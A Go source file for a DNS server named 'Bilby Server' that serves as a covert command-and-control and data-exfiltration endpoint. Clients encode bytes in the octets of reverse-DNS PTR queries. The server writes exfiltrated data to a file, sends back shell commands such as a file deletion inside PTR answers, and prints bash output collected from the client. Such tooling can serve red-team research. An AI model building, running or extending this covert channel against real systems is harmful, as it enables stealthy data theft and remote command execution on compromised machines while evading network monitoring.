package main

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/kpechenenko/rword"
	"github.com/miekg/dns"
)

var baseline int
var mode string
var collecting bool = false
var ls_bytes []byte

func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) string {
	var bytes []byte
	var c2_command string = ""

	// Specify what the client should do on the next connection to this server
	// Ex:	cmd.exfil-single.test.txt specifies that the client should exfiltrate (exf) the file test.txt to the server.
	c2_mappings := map[string]string{"hbt": "cmd.bash.rm-test2"}

	// If the first octet is equal to "172" or "185", the operation is setting the mode and current baseline. Otherwise, decode the data using the baseline.
	if octets[0] == "172" || octets[0] == "185" {
		val, err := strconv.Atoi(octets[3])
		if err != nil {
			log.Fatal(err)
		}
		*b = val

		switch octets[0] {
		case "172": // First octet of "172" denotes data exfiltration
			*m = "exfil"
		case "185": // First octet of "185" denotes c2 communication
			*m = "c2"
		}
	} else {
		// Gather the bytes encoded into the address
		for i := 0; i < 3; i++ {
			current_key, _ := strconv.Atoi(octets[0][i : i+1])
			int_to_write, _ := strconv.Atoi(octets[i+1])

			if current_key%2 == 0 {
				// If the digit at the index of the octet being inspected is even, then the octet was wrapped back over from 255 back to 0 and above.
				// If so, add 256 (the baseline is subtracted in either case).
				int_to_write = int_to_write + 256
			}
			d2 := []byte{byte(int_to_write - *b)}
			bytes = append(bytes, d2...)
		}

		// If the current mode is exfiltration, append the bytes to the output file ("recovered").
		if *m == "exfil" {
			// Open the file into which recovered data will be appended, with settings such that data can be added appropriately.
			f, _ := os.OpenFile("recovered", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if _, err := f.Write(bytes); err != nil {
				f.Close()
				log.Fatal(err)
			}
			if err := f.Close(); err != nil {
				log.Fatal(err)
			}
		} else { // If the current mode is C2 communication, interpret the bytes as a command.
			command := string(bytes[:])

			if *c && command != "fin" && command != "beg" {
				// While collecting, continue appending all received bytes to the ls byte slice instead of interpreting them as commands
				*lsb = append((*lsb), []byte(command)...)
			}

			switch command {
			case "beg": // Begin collecting the output bytes of the bash command
				*c = true
			case "fin": // Finish collecting the output bytes of the bash command, and output the gathered data.
				fmt.Printf("~$ %v", string(*lsb))
				*lsb = []byte{}
				*c = false
			default: // Otherwise, return the c2 command outlined in the c2_mappings map.
				c2_command = c2_mappings[command]
			}
		}
	}

	return c2_command
}

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {

	// Generate a random word that will appear as the domain name of the "DNS Response"
	var g rword.GenerateRandom
	var err error
	g, err = rword.New()
	if err != nil {
		panic(err)
	}
	word := g.Word()

	// Retrieve the octets being sent over.
	var ipv4 []string = strings.Split(r.Question[0].Name, ".in-addr.arpa.")

	// Divide the ipv4 string into each separate octet.
	var octets []string = strings.Split(ipv4[0], ".")

	// Reassmeble the octets such that they are in the correct, reverse order.
	var reassembled_octets []string
	for i := 0; i < len(octets); i++ {
		reassembled_octets = append([]string{octets[i]}, reassembled_octets...)
	}

	// Decode the data encoded into the octets.
	val := decodeAddress(reassembled_octets, &baseline, &mode, &collecting, &ls_bytes)

	// If we are responding with a command for the client, send the command. Otherwise, send back the randomly generated word.
	if val != "" {
		word = val
	}

	// Send a PTR response back to the client.
	m := new(dns.Msg)
	m.SetReply(r)
	rr, _ := dns.NewRR(fmt.Sprintf("%s  3600  IN  PTR  %s.net.", r.Question[0].Name, word))
	m.Answer = append(m.Answer, rr)
	w.WriteMsg(m)
}

func main() {
	// Start the server to communicate with the client
	// https://dev.to/jones_charles_ad50858dbc0/building-dns-resolution-and-domain-services-with-go-a-practical-guide-5d87
	dns.HandleFunc(".", handleRequest)
	server := &dns.Server{Addr: ":8053", Net: "udp"}
	fmt.Println("Bilby Server running on :8053")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
